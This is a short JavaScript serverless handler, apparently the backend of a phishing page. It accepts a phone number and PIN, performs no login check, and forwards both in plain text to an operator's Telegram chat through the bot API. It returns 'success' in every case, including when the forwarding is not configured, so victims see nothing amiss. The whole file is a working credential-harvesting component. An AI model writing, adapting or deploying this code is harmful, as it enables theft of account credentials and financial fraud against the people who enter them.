export default async function handler(req, res) {
  // Hanya terima POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { phone, pin } = req.body;

  if (!phone || !pin) {
    return res.status(400).json({ message: 'Phone and PIN required' });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.ADMIN_CHAT_ID;

  if (!token || !chatId) {
    console.error('Missing Telegram environment variables');
    return res.status(200).json({ success: true });
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const payload = {
      chat_id: chatId,
      text: 'Login: ' + phone + ' PIN: ' + pin,
    };

    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    console.log('Telegram response:', result);
  } catch (err) {
    console.error('Error sending Telegram message:', err);
  }

  return res.status(200).json({ success: true });
}